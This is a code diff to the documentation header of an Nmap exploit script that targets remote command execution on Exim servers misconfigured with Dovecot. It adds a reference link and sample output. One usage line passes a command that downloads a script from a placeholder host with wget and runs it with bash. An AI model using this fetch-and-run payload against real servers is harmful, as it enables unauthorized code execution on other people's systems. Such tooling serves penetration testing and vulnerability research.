@@ -7,6 +7,7 @@ concatenated with "``". The script takes care of the conversion automatically.
 
 References:
 * https://www.redteam-pentesting.de/en/advisories/rt-sa-2013-001/-exim-with-dovecot-typical-misconfiguration-leads-to-remote-command-execution
+* http://immunityproducts.blogspot.mx/2013/05/how-common-is-common-exim-and-dovecot.html
 * CVE not available yet
 ]]
 
@@ -14,6 +15,11 @@ References:
 -- @usage nmap -sV --script smtp-dovecot-exim-exec --script-args smtp-dovecot-exim-exec.cmd="uname -a" <target>
 -- @usage nmap -p586 --script smtp-dovecot-exim-exec --script-args smtp-dovecot-exim-exec.cmd="wget -O /tmp/p example.com/test.sh;bash /tmp/p" <target>
 --
+-- @output 
+-- PORT    STATE SERVICE REASON
+-- 465/tcp open  smtps   syn-ack
+-- |_smtp-dovecot-exim-exec: Malicious payload delivered:250 OK id=XXX
+-- 
 -- @args smtp-dovecot-exim-exec.cmd Command to execute. Separate commands with ";".
 -- @args smtp-dovecot-exim-exec.auth Authentication scheme (Optional).
 -- @args smtp-dovecot-exim-exec.user Authentication username (Optional).
@@ -31,7 +37,6 @@ categories = {"exploit"}
 local smtp = require "smtp"
 local shortport = require "shortport"
 local stdnse = require "stdnse"
-local string = require "string"
 
 portrule = shortport.port_or_service({25, 465, 587},
                 {"smtp", "smtps", "submission"})
